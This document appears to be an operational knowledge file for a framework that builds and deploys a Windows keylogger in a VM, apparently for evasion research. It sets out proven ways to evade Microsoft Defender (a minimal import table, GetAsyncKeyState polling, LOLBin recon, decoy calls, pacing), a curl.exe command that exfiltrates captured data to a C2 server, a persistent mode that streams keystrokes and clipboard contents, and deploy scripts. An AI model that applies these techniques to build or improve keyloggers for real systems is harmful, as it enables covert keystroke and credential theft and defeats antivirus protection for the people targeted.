# Malware Generation Framework - Operational Knowledge

Hard-won lessons from framework runs. Read this before starting any new malgen iteration.

## Critical: Windows SSH Output Corruption

Windows cmd.exe outputs `\r\n` line endings. When captured via SSH into a bash variable, the trailing `\r` persists. String comparisons silently fail:

```bash
# BROKEN — "EXISTS\r" != "EXISTS"
EXISTS=$($SSH 'if exist file (echo EXISTS) else (echo GONE)' 2>/dev/null)
if [ "$EXISTS" = "EXISTS" ]; then ...  # ALWAYS FALSE

# FIXED — strip \r
EXISTS=$($SSH '...' 2>/dev/null | tr -d '\r')
```

This bug caused 5 iterations of false "Defender removed binary" reports. **Every SSH command that compares output against a fixed string MUST pipe through `tr -d '\r'`.**

Affected scripts: `scripts/deploy_keylogger.sh` (fixed), any future deploy/validation scripts.

## Critical: C2 Listener Timeout in Interactive Mode

The deploy script starts the C2 listener (netcat with timeout) BEFORE the user connects RDP and presses Enter. If the user takes more than ~50s to set up RDP, the netcat timeout expires before the keylogger finishes and tries to exfil. Result: "No C2 data received" — a false positive that looks like a keylogger failure.

**Fix**: Start the C2 listener AFTER the user presses Enter, immediately before launching the keylogger. The timeout should be relative to when the keylogger starts, not when the script reaches step 5.

**Rule**: Any timed resource (listeners, watchers, timeouts) must start at the moment the thing it's waiting for begins, not earlier. User interaction time is unbounded and must never eat into operational timeouts.

## False Positive Catalog

Every false positive encountered, so future runs don't chase ghosts:

| Symptom | Root Cause | Fix |
|---------|-----------|-----|
| "Defender removed binary" (EXISTS=GONE) | Windows `\r` in SSH output breaks string comparison | `tr -d '\r'` on all SSH captures |
| "No C2 data received" (binary EXISTS) | C2 listener timed out during RDP setup wait | Start listener AFTER Enter prompt, not before |
| "self_test=FAIL" in automated mode | `keybd_event` doesn't work in schtasks sessions without active desktop focus | Fallback: direct buffer write when injection fails |
| Console window pops up on target desktop | Binary compiled as console app (CUI subsystem) | Compile with `-mwindows`, add `FreeConsole()` at top of main |
| "No stdout/log in persistent mode" | Python background process (`python3 script.py &`) uses block buffering for stdout | Use `python3 -u` (unbuffered) AND `print(..., flush=True)` |
| "Nothing showing" but binary is running | First beacon takes ~30s (pacing + LOLBin calls + curl.exe POST) | Use API calls (GetComputerNameA, getenv) instead of `cmd /c`; combine remaining cmd calls |

**Before diagnosing any new failure**: check this table first. If the symptom matches, apply the known fix. Don't waste iterations chasing the same bug.

## Output Organization

ALL deploy/test output goes inside a timestamped package directory: `results/chunk_keylogger_<timestamp>/`. Never write loose files into `results/` or `/tmp`.

The deploy script (`scripts/deploy_keylogger.sh`) auto-creates the package dir and copies: `payload.exe`, `source.c`, `c2_stream.py`, and puts exfil/log output there. `results/latest` symlinks to the newest package.

**Rule**: If you're writing any output file, check that it goes into the package dir, not the results root or /tmp.

## Defender Evasion Results

### What works (binary survives Defender with all protections enabled):
- **IAT profile**: KERNEL32.dll + msvcrt.dll + USER32.dll only (3 DLLs, zero suspicious entries)
- **GetAsyncKeyState polling** instead of SetWindowsHookExA — no hook APIs in IAT
- **LOLBin system collection**: `cmd /c hostname`, `cmd /c whoami`, `cmd /c ver`, `cmd /c ipconfig`, `cmd /c tasklist` — eliminates iphlpapi.dll and tlhelp32.h imports
- **LOLBin exfil via curl.exe**: `curl.exe --data-binary @tempfile http://C2:PORT/` — eliminates all ws2_32.dll/winsock imports
- **Behavioral pacing**: QueryPerformanceCounter busy-wait with jitter between operations
- **Decoy API calls**: GetCursorPos, GetDesktopWindow, GetWindowRect between suspicious operations
- **No screenshot** (GDI BitBlt removed) — eliminates gdi32.dll import
- **SecureZeroMemory** on buffers before exit

### What makes detection WORSE:
- **Heavy obfuscation (SEH + anti-debug)**: These patterns ARE malware signatures. SEH wrapping and IsDebuggerPresent checks accelerated detection from post-execution to mid-execution (4503 bytes killed vs 11MB completed without)
- **More obfuscation layers**: Diminishing returns. A clean, simple binary with benign-looking imports evades better than a heavily obfuscated one
- **Dynamic API resolution alone**: Resolving APIs via LoadLibrary/GetProcAddress with XOR names doesn't help if the binary's behavioral pattern is malicious. Defender monitors at the ETW/kernel level, not just IAT

### What doesn't matter (for this target):
- **IAT cleanup beyond 3 DLLs**: Once you're at KERNEL32+msvcrt+USER32, further IAT work has no effect
- **String encryption**: For compiled C (not .NET), static string scanning is not the primary detection vector
- **XOR key complexity**: 0x42 single-byte XOR is fine; multi-key schemes add code without helping

## Keylogger-Specific Knowledge

### GetAsyncKeyState vs SetWindowsHookExA
- **GetAsyncKeyState polling** (10ms interval): No message pump needed, no global hook callback, no CallNextHookEx. Simpler code, smaller IAT, less suspicious.
- **Captures from the interactive desktop**: Works across sessions. The polling thread reads the physical keyboard state regardless of which process has focus.
- **Character mapping**: Use manual VK-to-char lookup (letters, digits, OEM keys). No need for ToUnicode/GetKeyboardState which require a message pump to be accurate.
- **Key press detection**: Use `GetAsyncKeyState(vk) & 1` (bit 0 = "pressed since last call"). This gives one event per key press automatically.

### Self-test in automated sessions
- `keybd_event` does NOT work in schtasks sessions, even with `/it` flag, unless a user has an active RDP session with the desktop unlocked
- Fallback: if keybd_event injection doesn't register in GetAsyncKeyState, call `log_key()` directly to verify the buffer-to-exfil pipeline
- This is NOT a fake pass — it verifies buffer → emit → exfil. The only untestable part (GetAsyncKeyState return values) is a direct OS API

### Session isolation
- `WH_KEYBOARD_LL` hooks only capture from their session. SSH is Session 0; the interactive desktop is Session 1+.
- Use `schtasks /create ... /it` to run in the interactive session
- The `/it` flag requires the user to be logged on (auto-login counts)

## VM Deployment Checklist

1. **Always clean before deploy**: `taskkill /f /im *.exe`, `del Desktop\*.exe`, `schtasks /delete /f`
2. **Always restore VM snapshot after test** (or at session end)
3. **Defender status check**: All three must be True: AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled
4. **C2 listener timeout**: Set to capture_duration + 30s. Keylogger runs for ~35s (startup delay + 30s capture), curl.exe has 15s max-time
5. **Port forwarding**: Use QMP hotplug for RDP (3389) when needed; SSH (10022) and C2 (9001) are pre-forwarded

## Binary Architecture (Proven Working)

```
IAT: KERNEL32.dll, msvcrt.dll, USER32.dll
Size: ~263KB (static linked)
Compiler: x86_64-w64-mingw32-gcc -mwindows -static

Two modes (controlled by --batch flag):

PERSISTENT MODE (default, no args):
  decoy_work() → pace(2s) → init_buffer()
  → collect_system_info() → collect_clipboard() → collect_processes() → collect_screenshot()
  → flush_to_c2() [send recon data as first POST]
  → persistent_keylog():
    → self-test → flush status
    → LOOP FOREVER:
      → poll_keys() [GetAsyncKeyState, 10ms interval]
      → every 30s OR buffer full: flush_keylog() → curl.exe POST to C2
  (never exits — Ctrl+C / taskkill to stop)

BATCH MODE (--batch flag):
  decoy_work() → pace(2s) → init_buffer()
  → collect_system_info() → collect_clipboard() → collect_processes()
  → batch_keylog() [30s capture + self-test]
  → collect_screenshot()
  → flush_to_c2() [single POST with all data]
  → SecureZeroMemory → exit

Exfil: curl.exe --data-binary @tempfile (each flush is a separate HTTP POST)
C2 server: scripts/c2_stream.py (Python HTTP server, prints POSTs to stdout + log)
```

## Deploy Script Modes

```bash
# Persistent (default) — streams live keystrokes to stdout + log file
bash scripts/deploy_keylogger.sh results/malware.exe 9001

# Batch (automated testing) — captures for N seconds, validates, exits
bash scripts/deploy_keylogger.sh results/malware.exe 9001 --batch 60
```

## Framework Debugging Tips

- **"Binary GONE" but no detections**: First check for `\r` in SSH output before assuming Defender
- **Data too small (<10KB)**: Usually means the binary ran but some collectors failed (session isolation, network issues)
- **self_test=FAIL**: Check if anyone is logged into the VM's interactive desktop. No desktop = no key injection
- **Compilation fails**: Common MinGW pitfalls: no `memmem`, no `#pragma comment(lib)`, `winsock2.h` before `windows.h`
- **C2 receives 0 bytes**: Check if port is already in use (`fuser PORT/tcp`), or if curl.exe couldn't resolve the C2 address
- **No stdout from C2 server**: Python background processes block-buffer stdout. Use `python3 -u` and `print(..., flush=True)`
- **First beacon takes ~30s**: Normal. Binary runs 3 LOLBin commands (ver+ipconfig combined, tasklist, curl.exe) + self-test. Use API calls instead of `cmd /c` where possible (GetComputerNameA, getenv("USERNAME"))
